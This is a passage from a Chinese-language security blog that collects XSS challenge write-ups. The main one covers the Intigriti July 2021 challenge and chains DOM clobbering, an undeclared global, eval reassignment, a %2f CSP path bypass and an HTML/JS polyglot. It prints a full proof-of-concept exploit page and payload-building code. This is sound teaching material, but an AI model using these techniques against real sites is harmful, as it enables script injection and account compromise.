'Math.abs.name.constructor') for(let char of content) &#123; console.log(char) // if we can find it in the Math for the current index, use it let result = findMathName(currentIndex, char) if (result) &#123; addFunction(`$&#123;result&#125;.name.at`) addFunction(`$&#123;arrName&#125;.push`) currentIndex++ continue &#125; const mapping = [ ['Math.LN2.valueOf'], // 0 ['Math.LOG2E.valueOf'], // 1 ['Math.E.valueOf'], // 2 ['Math.PI.valueOf'], // 3 ] // try to find Math.fn[i] == char let found = false for(let i=0; i&lt;mapping.length; i++) &#123; result = findMathName(i, char) if (char === 'v' &amp;&amp; !result) &#123; result = 'Math.LN2.valueOf' &#125; if (result) &#123; addFunction(mapping[i][0]) addFunction(`$&#123;result&#125;.name.at`) addFunction(`$&#123;arrName&#125;.push`) currentIndex++ found = true break &#125; &#125; if (found) &#123; continue &#125; // @credit: @Astrid if (char === '(') &#123; addFunction('Math.isPrototypeOf.name.length.valueOf') addFunction('Math.log2') addFunction('Math.exp') addFunction('Math.abs.name.constructor.fromCharCode') addFunction(`$&#123;arrName&#125;.push`) currentIndex++ &#125; else if (char === '.') &#123; addFunction('Math.PI.valueOf') addFunction('Math.exp') addFunction('Math.acosh') addFunction('Math.exp') addFunction('Math.abs.name.constructor.fromCharCode') addFunction(`$&#123;arrName&#125;.push`) currentIndex++ &#125; else &#123; let mathResult = findTargetNumber(currentIndex, char.charCodeAt(0)) mathResult.reverse() // remember to reverse cause the order for(let row of mathResult) &#123; addFunction(row) &#125; addFunction('Math.abs.name.constructor.fromCharCode') addFunction(`$&#123;arrName&#125;.push`) currentIndex++ &#125; &#125; // add eval structure addFunction('Math.random.name.valueOf') addFunction(`$&#123;arrName&#125;.join`) addFunction('Math.abs.constructor') addFunction('Math.abs.constructor.prototype.call.call') return ans.reverse() function addFunction(name)&#123; ans.unshift(name) codeResult = `$&#123;name&#125;($&#123;codeResult&#125;)` &#125; &#125; Math.seeds = [] // @credit: @DrBrix const arr = buildExploit('Math.seeds', 'eval(parent.name)') console.log('length:', arr.length) console.log(arr.join(',')) 或許還有更短的，但我懶得找了。 總結以上就是 Math jail 的解法以及思考方式。 原本最理想的狀況是可以從 Math 就找到一個能用的陣列，就不需要 Math.seeds，不過我試了一下似乎是沒有找到，因此才出現這個比較突兀的東西。 我自己也從其他 hacker 們的解法中學習到很多，像是清空陣列或是更短的 payload 等等，都是我當初在設計題目時也沒有想到的，大家真的都很厲害。","link":"/2023/08/29/intigriti-0823-author-writeup/"},{"title":"Intigriti 七月份 XSS 挑戰：突破層層關卡","text":"前言Intigriti 這個網站每個月都會有 XSS 挑戰，給你一週的時間去解一道 XSS 的題目，目標是成功執行 alert(document.domain)。 身為一個前端資安混血工程師，我每個月都有參加（但不一定有解出來），底下是前幾個月的筆記： 解題心得：Intigriti’s 0421 XSS challenge（上） Intigriti’s 0521 XSS 挑戰解法：限定字元組合程式碼 Intigriti 六月份 XSS 挑戰檢討 每個月的挑戰都相當有趣，我覺得難易度也掌握得不錯，沒有到超級無敵難，但也不會輕易到一下就被解開。而這個月的挑戰我也覺得很好玩，因此在解開之後寫了這篇心得跟大家分享，期待有越來越多人可以一起參與。 挑戰網址：https://challenge-0721.intigriti.io/ 分析題目仔細看一下會發現這次的挑戰其實比較複雜一點，因為有三個頁面跟一堆的 postMessage 還有 onmessage，要搞清楚他們的關係需要一些時間。 我看了一下之後因為懶得搞懂，所以決定從反方向開始解。如果是 XSS 題目，代表一定要有地方可以執行程式碼，通常都是 eval 或是 innerHTML，所以可以先找到這邊，再往回推該如何抵達。 接下來就來簡單看一下那三個頁面： index.html htmledit.php console.php index.html&lt;div class=\"card-container\"> &lt;div class=\"card-header-small\">Your payloads:&lt;/div> &lt;div class=\"card-content\"> &lt;script> // redirect all htmledit messages to the console onmessage = e =>&#123; if (e.data.fromIframe)&#123; frames[0].postMessage(&#123;cmd:\"log\",message:e.data.fromIframe&#125;, '*'); &#125; &#125; /* var DEV = true; var store = &#123; users: &#123; admin: &#123; username: 'inti', password: 'griti' &#125;, moderator: &#123; username: 'root', password: 'toor' &#125;, manager: &#123; username: 'andrew', password: 'hunter2' &#125;, &#125; &#125; */ &lt;/script> &lt;div class=\"editor\"> &lt;span id=\"bin\"> &lt;a onclick=\"frames[0].postMessage(&#123;cmd:'clear'&#125;,'*')\">🗑️&lt;/a> &lt;/span> &lt;iframe class=console src=\"./console.php\">&lt;/iframe> &lt;iframe class=codeFrame src=\"./htmledit.php?code=&lt;img src=x>\">&lt;/iframe> &lt;textarea oninput=\"this.previousElementSibling.src='./htmledit.php?code='+escape(this.value)\">&lt;img src=x>&lt;/textarea> &lt;/div> &lt;/div> &lt;/div> 除了被註解的那一段變數之外，看起來沒什麼特別的。 htmledit.php&lt;!-- &amp;lt;img src=x&amp;gt; --> &lt;!DOCTYPE html> &lt;html lang=\"en\"> &lt;head> &lt;meta charset=\"UTF-8\"> &lt;title>Native HTML editor&lt;/title> &lt;script nonce=\"d8f00e6635e69bafbf1210ff32f96bdb\"> window.addEventListener('error', function(e)&#123; let obj = &#123;type:'err'&#125;; if (e.message)&#123; obj.text = e.message; &#125; else &#123; obj.text = `Exception called on $&#123;e.target.outerHTML&#125;`; &#125; top.postMessage(&#123;fromIframe:obj&#125;, '*'); &#125;, true); onmessage=(e)=>&#123; top.postMessage(&#123;fromIframe:e.data&#125;, '*') &#125; &lt;/script> &lt;/head> &lt;body> &lt;img src=x>&lt;/body> &lt;/html> &lt;!-- /* Page loaded in 0.000024 seconds */ --> 這個頁面會直接把 query string code 的內容顯示在頁面上，然後開頭還有一段神秘的註解，是把 code encode 之後的內容。但儘管顯示在頁面上卻沒辦法執行，因為有著嚴格的 CSP：script-src &#39;nonce-...&#39;;frame-src https:;object-src &#39;none&#39;;base-uri &#39;none&#39;; 不過 CSP 裡面特別開了 frame-src，我看到這邊的時候想說：「這可能是個提示，提示我們要用 iframe」 console.php&lt;!DOCTYPE html> &lt;html lang=\"en\"> &lt;head> &lt;meta charset=\"UTF-8\"> &lt;script nonce=\"c4936ad76292ee7100ecb9d72054e71f\"> name = 'Console' document.title = name; if (top === window)&#123; document.head.parentNode.remove(); // hide code if not on iframe &#125; &lt;/script> &lt;style> body, ul &#123; margin:0; padding:0; &#125; ul#console &#123; background: lightyellow; list-style-type: none; font-family: 'Roboto Mono', monospace; font-size: 14px; line-height: 25px; &#125; ul#console li &#123; border-bottom: solid 1px #80808038; padding-left: 5px; &#125; &lt;/style> &lt;/head> &lt;body> &lt;ul id=\"console\">&lt;/ul> &lt;script nonce=\"c4936ad76292ee7100ecb9d72054e71f\"> let a = (s) => s.anchor(s); let s = (s) => s.normalize('NFC'); let u = (s) => unescape(s); let t = (s) => s.toString(0x16); let parse = (e) => (typeof e === 'string') ? s(e) : JSON.stringify(e, null, 4); // make object look like string let log = (prefix, data, type='info', safe=false) => &#123; let line = document.createElement(\"li\"); let prefix_tag = document.createElement(\"span\"); let text_tag = document.createElement(\"span\"); switch (type)&#123; case 'info':&#123; line.style.backgroundColor = 'lightcyan'; break; &#125; case 'success':&#123; line.style.backgroundColor = 'lightgreen'; break; &#125; case 'warn':&#123; line.style.backgroundColor = 'lightyellow'; break; &#125; case 'err':&#123; line.style.backgroundColor = 'lightpink'; break; &#125; default:&#123; line.style.backgroundColor = 'lightcyan'; &#125; &#125; data = parse(data); if (!safe)&#123; data = data.replace(/&lt;/g, '&amp;lt;'); &#125; prefix_tag.innerHTML = prefix; text_tag.innerHTML = data; line.appendChild(prefix_tag); line.appendChild(text_tag); document.querySelector('#console').appendChild(line); &#125; log('Connection status: ', window.navigator.onLine?\"Online\":\"Offline\") onmessage = e => &#123; switch (e.data.cmd) &#123; case \"log\": &#123; log(\"[log]: \", e.data.message.text, type=e.data.message.type); break; &#125; case \"anchor\": &#123; log(\"[anchor]: \", s(a(u(e.data.message))), type='info') break; &#125; case \"clear\": &#123; document.querySelector('#console').innerHTML = \"\"; break; &#125; default: &#123; log(\"[???]: \", `Wrong command received: \"$&#123;e.data.cmd&#125;\"`) &#125; &#125; &#125; &lt;/script> &lt;script nonce=\"c4936ad76292ee7100ecb9d72054e71f\"> try &#123; if (!top.DEV) throw new Error('Production build!'); let checkCredentials = (username, password) => &#123; try&#123; let users = top.store.users; let access = [users.admin, users.moderator, users.manager]; if (!users || !password) return false; for (x of access) &#123; if (x.username === username &amp;&amp; x.password === password) return true &#125; &#125; catch &#123; return false &#125; return false &#125; let _onmessage = onmessage; onmessage = e => &#123; let m = e.data; if (!m.credentials || !checkCredentials(m.credentials.username, m.credentials.password)) &#123; return; // do nothing if unauthorized &#125; switch(m.cmd)&#123; case \"ping\": &#123; // check the connection e.source.postMessage(&#123;message:'pong'&#125;,'*'); break; &#125; case \"logv\": &#123; // display variable's value by its name log(\"[logv]: \", window[m.message], safe=false, type='info'); break; &#125; case \"compare\": &#123; // compare variable's value to a given one log(\"[compare]: \", (window[m.message.variable] === m.message.value), safe=true, type='info'); break; &#125; case \"reassign\": &#123; // change variable's value let o = m.message; try &#123; let RegExp = /^[s-zA-Z-+0-9]+$/; if (!RegExp.test(o.a) || !RegExp.test(o.b)) &#123; throw new Error('Invalid input given!'); &#125; eval(`$&#123;o.a&#125;=$&#123;o.b&#125;`); log(\"[reassign]: \", `Value of \"$&#123;o.a&#125;\" was changed to \"$&#123;o.b&#125;\"`, type='warn'); &#125; catch (err) &#123; log(\"[reassign]: \", `Error changing value ($&#123;err.message&#125;)`, type='err'); &#125; break; &#125; default: &#123; _onmessage(e); // keep default functions &#125; &#125; &#125; &#125; catch &#123; // hide this script on production document.currentScript.remove(); &#125; &lt;/script> &lt;script src=\"./analytics/main.js?t=1627610836\">&lt;/script> &lt;/body> &lt;/html> 這個頁面的程式碼比其他兩頁多很多，而且可以找到一些我們需要的東西，比如說 eval： let _onmessage = onmessage; onmessage = e => &#123; let m = e.data; if (!m.credentials || !checkCredentials(m.credentials.username, m.credentials.password)) &#123; return; // do nothing if unauthorized &#125; switch(m.cmd)&#123; // ... case \"reassign\": &#123; // change variable's value let o = m.message; try &#123; let RegExp = /^[s-zA-Z-+0-9]+$/; if (!RegExp.test(o.a) || !RegExp.test(o.b)) &#123; throw new Error('Invalid input given!'); &#125; eval(`$&#123;o.a&#125;=$&#123;o.b&#125;`); log(\"[reassign]: \", `Value of \"$&#123;o.a&#125;\" was changed to \"$&#123;o.b&#125;\"`, type='warn'); &#125; catch (err) &#123; log(\"[reassign]: \", `Error changing value ($&#123;err.message&#125;)`, type='err'); &#125; break; &#125; default: &#123; _onmessage(e); // keep default functions &#125; &#125; &#125; 但這邊的 eval 似乎沒辦法讓我們直接執行想要的程式碼，因為規範滿嚴格的（大寫字母、部分小寫字母、數字跟 +-），可能是有其他用途。 另外一個有機會的地方是這裡： let log = (prefix, data, type='info', safe=false) => &#123; let line = document.createElement(\"li\"); let prefix_tag = document.createElement(\"span\"); let text_tag = document.createElement(\"span\"); switch (type)&#123; // not important &#125; data = parse(data); if (!safe)&#123; data = data.replace(/&lt;/g, '&amp;lt;'); &#125; prefix_tag.innerHTML = prefix; text_tag.innerHTML = data; line.appendChild(prefix_tag); line.appendChild(text_tag); document.querySelector('#console').appendChild(line); &#125; 如果 safe 是 true 的話，那 data 就不會被 escape，就可以插入任意的 HTML，達成 XSS。 而這邊值得注意的是函式的參數那一段：let log = (prefix, data, type=&#39;info&#39;, safe=false)，這點值得特別解釋一下。 在有些程式語言裡面，支援這種參數的命名，在呼叫 function 的時候可以用名稱來傳入參數，例如說：log(prefix=&#39;a&#39;, safe=true)，就傳入對應到的參數。 但是在 JS 裡面並沒有這種東西，參數的對應完全是靠「順序」來決定的。舉例來說，log(&quot;[logv]: &quot;, window[m.message], safe=false, type=&#39;info&#39;); 對應到的參數其實是： prefix: &quot;[logv]: &quot; data: window[m.message] type: false safe: &#39;info&#39; 是靠順序而不是靠名稱，這也是許多新手會被搞混的地方。 總之呢，就讓我們從 log 這個函式開始往回找吧，要執行到這一段，必須要 post message 到這個 window，然後符合一些條件。 第一關：成功 post message這個 console.php 的頁面有一些條件限制，如果沒有符合這些條件就沒辦法執行到 log function 去。 首先這個頁面必須被 embed 在 iframe 裡面： name = 'Console' document.title = name; if (top === window)&#123; document.head.parentNode.remove(); // hide code if not on iframe &#125; 再來還有這些檢查要通過： try &#123; if (!top.DEV) throw new Error('Production build!'); let checkCredentials = (username, password) => &#123; try&#123; let users = top.store.users; let access = [users.admin, users.moderator, users.manager]; if (!users || !password) return false; for (x of access) &#123; if (x.username === username &amp;&amp; x.password === password) return true &#125; &#125; catch &#123; return false &#125; return false &#125; let _onmessage = onmessage; onmessage = e => &#123; let m = e.data; if (!m.credentials || !checkCredentials(m.credentials.username, m.credentials.password)) &#123; return; // do nothing if unauthorized &#125; // ... &#125; &#125; catch &#123; // hide this script on production document.currentScript.remove(); &#125; top.DEV 要是 truthy，然後傳進去的 credentials 要符合 top.store.users.admin.username 還有 top.store.users.admin.password 這樣我應該自己寫一個頁面，然後設置一下這些全域變數就好了？ 沒辦法，因為有 Same Origin Policy 的存在，你只能存取同源頁面下的 window 內容，所以如果是自己寫一個頁面然後把 console.php embed 在裡面的話，在存取 top.DEV 時就會出錯。 所以我們需要有一個同源的頁面可以讓我們設置一些東西。而這個頁面，顯然就是可以讓我們插入一些 HTML 的 htmledit.php 了。 DOM clobbering該怎麼在不能執行 JS 的情況下設置全域變數呢？沒錯，就是 DOM clobbering。 舉例來說，如果你有個 &lt;div id=&quot;a&quot;&gt;&lt;/div&gt;，在 JS 裡面你就可以用 window.a 或是 a 去存取到這個 div 的 DOM。 如果你對 DOM clobbering 不熟的話可以參考我之前寫過的淺談 DOM Clobbering 的原理及應用，或是這一篇也寫得很好：使用 Dom Clobbering 扩展 XSS 如果要達成多層的變數設置，就要利用到 iframe 搭配 srcdoc： &lt;a id=\"DEV\">&lt;/a> &lt;iframe name=\"store\" srcdoc=' &lt;a id=\"users\">&lt;/a> &lt;a id=\"users\" name=\"admin\" href=\"ftp://a:a@a\">&lt;/a> '> &lt;/iframe> &lt;iframe name=\"iframeConsole\" src=\"https://challenge-0721.intigriti.io/console.php\">&lt;/iframe> 這邊還有利用到一個特性是 a 元素的 username 屬性會是 href 屬性裡 URL 的 username。 這樣設置的話，top.DEV 就會是 a id=&quot;DEV&quot;&gt;&lt;/a&gt; 這個 DOM，而 store.users 就會是 HTMLCollection，store.users.admin 是那個 a，store.users.admin.username 則會是 href 裡面的 username，也就是 a，而密碼也是一樣的。 綜合以上所述，我可以自己寫一個 HTML 然後用 window.open 去開啟 htmledit.php 然後把上面的內容帶進去： &lt;!DOCTYPE html> &lt;html lang=\"en\"> &lt;head> &lt;meta charset=\"utf-8\"> &lt;title>XSS POC&lt;/title> &lt;/head> &lt;body> &lt;script> const htmlUrl = 'https://challenge-0721.intigriti.io/htmledit.php?code=' const payload = ` &lt;a id=\"DEV\">&lt;/a> &lt;iframe name=\"store\" srcdoc=' &lt;a id=\"users\">&lt;/a> &lt;a id=\"users\" name=\"admin\" href=\"ftp://a:a@a\">&lt;/a> '>&lt;/iframe> &lt;iframe name=\"iframeConsole\" src=\"https://challenge-0721.intigriti.io/console.php\">&lt;/iframe> ` var win = window.open(htmlUrl + encodeURIComponent(payload)) // wait unitl window loaded setTimeout(() => &#123; console.log('go') const credentials = &#123; username: 'a', password: 'a' &#125; win.frames[1].postMessage(&#123; cmd: 'test', credentials &#125;, '*') &#125;, 5000) &lt;/script> &lt;/body> &lt;/html> 如此一來，我就可以用 postMessage 送訊息進去了。 雖然花了一番功夫，但這才只是開始而已。 第二關：讓 safe 變成 truesafe 要是 true，這樣呼叫 log 的時候才不會把 &lt; escape，要讓 safe 是 true 的話，要找到有傳入四個參數的呼叫，因為第四個會是 safe 的值： case \"logv\": &#123; // display variable's value by its name log(\"[logv]: \", window[m.message], safe=false, type='info'); break; &#125; case \"compare\": &#123; // compare variable's value to a given one log(\"[compare]: \", (window[m.message.variable] === m.message.value), safe=true, type='info'); break; &#125; log(&quot;[logv]: &quot;, window[m.message], safe=false, type=&#39;info&#39;) 這個我在找的 function call，而這之中第二個參數會是 window[m.message]，也就是說可以把任一全域變數當作 data 傳進去，可是要傳什麼呢？ 第三關：找到可以傳入的變數我在這邊卡得滿久的，因為我想不太到這邊可以傳什麼。以前有一招是可以傳 name，但是這個網頁已經自己設定 name 了所以沒辦法。另一招是用 URL 去傳就可以把東西放在 location 上面，但 log 裡面會檢查 data 是不是字串，不是的話要先經過 JSON.stringify，會把內容encode。 卡很久的我只好不斷重複看著程式碼，看能不能找出什麼新東西，結果還真的找到了。下面這段 code 有一個新手常見問題，你有看出來嗎？ let checkCredentials = (username, password) => &#123; try&#123; let users = top.store.users; let access = [users.admin, users.moderator, users.manager]; if (!users || !password) return false; for (x of access) &#123; if (x.username === username &amp;&amp; x.password === password) return true &#125; &#125; catch &#123; return false &#125; return false &#125; 這個問題就出在 for (x of access) &#123;，x 忘了宣告，所以預設就會變成全域變數。在這邊的話，x 會是 top.store.users.admin，也就是我們自己設置的那個 &lt;a&gt;。 第四關：繞過型態檢查既然我們有了這個 x，就可以把它用 logv 這個 command 傳入 log function，然後因為 safe 會是 true，所以就可以直接把 x 的內容用 innerHTML 顯示出來。 如果你把一個 a 元素變成字串，會得到 a.href 的內容，所以我們可以把我們的 payload 放在 href 裡面。 但是，log 裡面會檢查 data 的型態，而 a 不是字串所以過不了檢查，這該怎麼辦呢？ 這時候我重新看了一遍程式碼，發現了這個指令： case \"reassign\": &#123; // change variable's value let o = m.message; try &#123; let RegExp = /^[s-zA-Z-+0-9]+$/; if (!RegExp.test(o.a) || !RegExp.test(o.b)) &#123; throw new Error('Invalid input given!'); &#125; eval(`$&#123;o.a&#125;=$&#123;o.b&#125;`); log(\"[reassign]: \", `Value of \"$&#123;o.a&#125;\" was changed to \"$&#123;o.b&#125;\"`, type='warn'); &#125; catch (err) &#123; log(\"[reassign]: \", `Error changing value ($&#123;err.message&#125;)`, type='err'); &#125; break; &#125; 我可以這樣做： win.frames[1].postMessage(&#123; cmd: 'reassign', message:&#123; a: 'Z', b: 'x+1' &#125;, credentials &#125;, '*') 這就等於是 Z=x+1，然後 x+1 的時候會因為自動轉型的關係變成字串，這樣一來 Z 就會是一個含有我們 payload 的字串了。 第五關：繞過 encode雖然我們現在可以傳字串進去了，但還有一件事情要搞定，那就是因為 href 裡面的東西是 URL 所以會被 encode，例如說 &lt; 會變成 %3C： var a = document.createElement('a') a.setAttribute('href', 'ftp://a:a@a#&lt;img src=x onload=alert(1)>') console.log(a+1) // ftp://a:a@a/#%3Cimg%20src=x%20onload=alert(1)%3E1 這又要怎麼辦呢？ 在 log 裡面有一行是 data = parse(data)，而 parse 的程式碼是這樣的： let parse = (e) => (typeof e === 'string') ? s(e) : JSON.stringify(e, null, 4); // make object look like string 如果 e 是字串，那就回傳 s(e)，而這個 s 是另外一個函式。 當初在看程式碼的時候，我看到 reassign 那邊對於 eval 的檢查時，就注意到了它的規則：RegExp = /^[s-zA-Z-+0-9]+$/;，還有底下這四個函式： let a = (s) => s.anchor(s); let s = (s) => s.normalize('NFC'); let u = (s) => unescape(s); let t = (s) => s.toString(0x16); 其中 s, u 跟 t 這三個字元都是允許的，也就是說，可以透過 reassign 這個指令把他們互換！我們可以把 s 換成 u，這樣 data 就會被 unescape 了！ 所以最後的程式碼會長這樣： const htmlUrl = 'https://challenge-0721.intigriti.io/htmledit.php?code=' const insertPayload=`&lt;img src=x onerror=alert(1)>` const payload = ` &lt;a id=\"DEV\">&lt;/a> &lt;iframe name=\"store\" srcdoc=' &lt;a id=\"users\">&lt;/a> &lt;a id=\"users\" name=\"admin\" href=\"ftp://a:a@a#$&#123;escape(insertPayload)&#125;\">&lt;/a> '>&lt;/iframe> &lt;iframe name=\"iframeConsole\" src=\"https://challenge-0721.intigriti.io/console.php\">&lt;/iframe> ` var win = window.open(htmlUrl + encodeURIComponent(payload)) // 等待 window 載入完成 setTimeout(() => &#123; console.log('go') const credentials = &#123; username: 'a', password: 'a' &#125; // s=u win.frames[1].postMessage(&#123; cmd: 'reassign', message:&#123; a: 's', b: 'u' &#125;, credentials &#125;, '*') // Z=x+1 so Z = x.href + 1 win.frames[1].postMessage(&#123; cmd: 'reassign', message:&#123; a: 'Z', b: 'x+1' &#125;, credentials &#125;, '*') // log window[Z] win.frames[1].postMessage(&#123; cmd: 'logv', message: 'Z', credentials &#125;, '*') &#125;, 5000) 所以 data 會是 ftp://a:a@a#&lt;img src=x onerror=alert(1)&gt;，然後被設定到 HTML 上面，觸發 XSS！ 不，事情沒那麼順利…我忘記有 CSP 了。 第六關：繞過 CSP雖然我可以插入任意 HTML，但很遺憾地這個網頁也有 CSP： script-src &#39;nonce-xxx&#39; https:&#x2F;&#x2F;challenge-0721.intigriti.io&#x2F;analytics&#x2F; &#39;unsafe-eval&#39;; frame-src https:; object-src &#39;none&#39;;base-uri &#39;none&#39;; 因為沒有 unsafe-inline，所以我們之前的 payload 是無效的。而這一段 CSP 當中，https://challenge-0721.intigriti.io/analytics/ 顯然是個很可疑的路徑。 這個頁面其實有引入一個 https://challenge-0721.intigriti.io/analytics/main.js 的檔案，但裡面沒有東西，只有一些註解而已。 其實看到這邊的時候我就知道要怎麼做了，因為我之前有學到一個繞過 CSP 的技巧，利用%2F（編碼過後的 /）以及前後端對於 URL 解析的不一致。 以 https://challenge-0721.intigriti.io/analytics/..%2fhtmledit.php 為例，對瀏覽器來說，這個 URL 是在 /analytics 底下，所以可以通過 CSP 的檢查。 但是對伺服器來說，這一段是 https://challenge-0721.intigriti.io/analytics/../htmledit.php 也就是 https://challenge-0721.intigriti.io/htmledit.php 所以我們成功繞過了 CSP，載入不同路徑的檔案！ 因此現在的目標就變成我們要找一個檔案裡面可以讓我們放 JS 程式碼。看來看去都只有 htmledit.php 能用，但它不是一個 HTML 嗎？ 第七關：構造 JS 程式碼如果你還記得的話，這個頁面的開頭有一段是 HTML 的註解： &lt;!-- &amp;lt;img src=x&amp;gt; --> .... 而在一些情況下，其實這語法也是 JS 的註解。不是我說的，是規格書說的： 換句話說呢，我們可以利用這點，做出一個看起來像 HTML，但實際上也是合法 JS 的檔案！ 我最後做出來的 URL 是這樣：https://challenge-0721.intigriti.io/htmledit.php?code=1;%0atop.alert(document.domain);/* 產生的 HTML 長這樣： &lt;!-- 1; 這邊都是註解 top.alert(document.domain);/* --> 這之後也都是註解了 &lt;!DOCTYPE html> &lt;html lang=\"en\"> &lt;head> ... 第一行是註解，/* 之後也都是註解，所以這一整段其實就是 top.alert(document.domain); 的意思。 不過這邊可以注意的是 htmledit.php 的 content type 不會變，依然還是 text/html，之所以可以把它當作 JS 引入，是因為同源的關係。如果你是把一個不同源的 HTML 當作 JS 引入，就會被 CORB 給擋下來。 做到這邊，我們就可以讓 data 是 &lt;script src=&quot;https://challenge-0721.intigriti.io/htmledit.php?code=1;%0atop.alert(document.domain);/*&quot;&gt;&lt;/script&gt; 這樣就會執行到 text_tag.innerHTML = data，成功在頁面上放進去 script 還繞過了 CSP，完美！ 但可惜的是，還差一點點… 第八關：執行動態插入的 script就在我以為要過關的時候，卻發現我的 script 怎樣都不會執行。後來用關鍵字去查，才發現如果是用 innerHTML 插入 script 標籤，插入之後是不會去執行的。 我試著用 innerhtml import script 或是 innerhtml script run 之類的關鍵字去找解法但都沒找到。 最後，我是突然想到可以試試看 &lt;iframe srcdoc=&quot;...&quot;&gt;，有種死馬當活馬醫的感覺，反正就試試看這樣行不行，沒有損失。 結果沒想到就可以了。直接 assign 給 innerHTML 不行，但如果內容是：&lt;iframe srcdoc=&quot;&lt;script src=&#39;...&#39;&gt;&lt;/script&gt;&quot; 就可以，就會直接載入 script。 最後解法最後再補充一件事情，我要送出答案之前發現我的答案在 Firefox 上面不能跑，原因是這段程式碼： &lt;a id=\"users\">&lt;/a> &lt;a id=\"users\" name=\"admin\" href=\"a\">&lt;/a> 在 Chrome 上 window.users 會是 HTMLCollection，但在 Firefox 上面只會拿到一個 a 元素，而 window.users.admin 也就是 undefined。 但這問題不大，只要多一層 iframe 就可以搞定： &lt;iframe name=\"store\" srcdoc=\" &lt;iframe srcdoc='&lt;a id=admin href=ftp://a:a@a#>&lt;/a>' name=users> \"> &lt;/iframe> 我最後的答案長這樣： &lt;!DOCTYPE html> &lt;html lang=\"en\"> &lt;head> &lt;meta charset=\"utf-8\"> &lt;title>XSS POC&lt;/title> &lt;/head> &lt;body> &lt;script> const htmlUrl = 'https://challenge-0721.intigriti.io/htmledit.php?code=' const exploitSrc = '/analytics/..%2fhtmledit.php?code=1;%0atop.alert(document.domain);/*' const insertPayload=`&lt;iframe srcdoc=\"&lt;script src=$&#123;exploitSrc&#125;>&lt;\\/script>\">` const payload = ` &lt;a id=\"DEV\">&lt;/a> &lt;iframe name=\"store\" srcdoc=\" &lt;iframe srcdoc='&lt;a id=admin href=ftp://a:a@a#$&#123;escape(insertPayload)&#125;>&lt;/a>' name=users> \"> &lt;/iframe> &lt;iframe name=\"iframeConsole\" src=\"https://challenge-0721.intigriti.io/console.php\">&lt;/iframe> ` var win = window.open(htmlUrl + encodeURIComponent(payload)) // wait for 3s to let window loaded setTimeout(() => &#123; const credentials = &#123; username: 'a', password: 'a' &#125; win.frames[1].postMessage(&#123; cmd: 'reassign', message:&#123; a: 's', b: 'u' &#125;, credentials &#125;, '*') win.frames[1].postMessage(&#123; cmd: 'reassign', message:&#123; a: 'Z', b: 'x+1' &#125;, credentials &#125;, '*') win.frames[1].postMessage(&#123; cmd: 'logv', message: 'Z', credentials &#125;, '*') &#125;, 3000) &lt;/script> &lt;/body> &lt;/html> 其他解法我的方法是新開一個 window 來 post message，但其實也可以把自己作為 iframe，讓 htmledit.php embed，這樣的話其實也可以用 top.postMessage 去傳送訊息。 「把自己 embed 在其他網頁中」這個是我很常忘記的一個方法。 另一個非預期的解法也很神奇，是根據這一段： case \"log\": &#123; log(\"[log]: \", e.data.message.text, type=e.data.message.type); break; &#125; 這一段的重點是 type=e.data.message.type，會設置一個 global variable 叫做 type，因此其實可以透過這邊傳入任意 payload，再去呼叫 logv 就好。就省去了把 payload 放在 a 上面那一大堆要處理的事情。 總結我滿喜歡這次的這個題目，因為有種層層關卡的感覺，一關一關慢慢過，每當我以為要破關的時候，就又卡住了，直到最後才把所有關卡都解完，成功執行 XSS。 從這個挑戰中，可以學習到的前端知識是： DOM clobbering JS 的註解不是只有 &#x2F;&#x2F; 跟 &#x2F;* *&#x2F; CSP 針對 path 的繞過 用 innerHTML 新增的 script 不會執行 針對上一點，可以用 iframe srcdoc 來繞過（但一般狀況下應該新增一個 script tag 然後 append） 從這個題目中可以學習或是複習滿多技巧的，CTF 跟這種挑戰有趣的點就在這邊，雖然說每樣東西拆開來可能都知道，但要怎麼精心串起來，是很考驗經驗跟功力的。 如果對 XSS 挑戰有興趣，可以關注 Intigriti 並且等待下一次的挑戰。","link":"/2021/08/06/intigriti-xss-0721/"},{"title":"從 Intigriti 十月份 XSS 挑戰重新學習 HTML","text":"前言之前已經介紹過 Intigriti 的 XSS 挑戰很多次了，這次就不再介紹了，有興趣的可以直接翻我之前的文章。這一篇文章的重點會放在他們十月份的挑戰，難度不高，我花了大約一兩天的時間解出來以後就放著沒動，會想寫這篇是因為挑戰結束以後，看到許多超乎我想像的解法，因此特地寫一篇文章記錄一下。 關於挑戰底下先簡單講一下這次的題目要做什麼，核心程式碼是這樣的： window.addEventListener(\"DOMContentLoaded\", function () &#123; e = `)]&#125;'` + new URL(location.href).searchParams.get(\"xss\"); c = document.getElementById(\"body\").lastElementChild; if (c.id === \"intigriti\") &#123; l = c.lastElementChild; i = l.innerHTML.trim(); f = i.substr(i.length - 4); e = f + e; &#125; let s = document.createElement(\"script\"); s.type = \"text/javascript\"; s.appendChild(document.createTextNode(e)); document.body.appendChild(s); &#125;); 首先，有一個字串 e 會被丟去 script 標籤裡面，因此只要 e 變成一串合法的 JS 程式碼，呼叫 alert(document.domain) 就獲勝了。而 e 的預設內容就是一個奇形怪狀的字串：)]&#125;&#39; 再加上 query string 上的 xss 的值。 接下來就是這題的精華了，會先判斷 body 的 lastElementChild 的 id 是不是 intigriti，是的話就去拿這個元素的 lastElementChild 的 innerHTML 的最後四個字元，然後放到 e 前面。我們先叫這四個字 last4 好了，e 就會是 &#123;last4&#125;)]&#125;&#39;&#123;qs&#125;，總之目標就是讓這整段是個合法程式碼。 qs 的部份因為可以自己控制，所以沒什麼問題，但重點是前面那個 last4。 我當初的想法很簡單，只要 last4 的開頭是 &#39;，那前面就會變一段字串，再搭配 qs 就可以變一段合法程式碼，像這樣：&#39;xxx)]&#125;&#39;;alert(1)。 問題來了，那該怎麼控制 last4？這就要看題目另一個可以做 HTML injection 的地方。 &lt;div id=\"html\" class=\"text\">&lt;h1 class=\"light\"> here &lt;/div> &lt;!-- !!! --> &lt;div class=\"a\">'\"&lt;/div> &lt;/body> &lt;div id=\"container\"> &lt;span>I&lt;/span> &lt;span id=\"extra-flicker\">N&lt;/span> &lt;span>T&lt;/span> &lt;span>I&lt;/span> &lt;div id=\"broken\"> &lt;span id=\"y\">G&lt;/span> &lt;/div> &lt;span>R&lt;/span> &lt;div id=\"broken\"> &lt;span id=\"y\">I&lt;/span> &lt;/div> &lt;span>T&lt;/span> &lt;span>I&lt;/span> &lt;/div> 題目的 HTML 最後一部分長這樣，而那個 here 地方的值我們可以控制，所以可以注入任意 HTML 進去（但直接想做 XSS 是沒用的，因為有 CSP）。在現今的狀況之下，body 的 lastElementChild 會是 container。 所以我們的第一個挑戰就是想辦法改變 lastElementChild。 HTML 的自動修正雖然說看似木已成舟，沒辦法改變最後的元素，但事實上我們可以把整段用一個沒有關閉標籤的 div 包起來，像是這樣： &lt;div id=\"html\" class=\"text\">&lt;h1 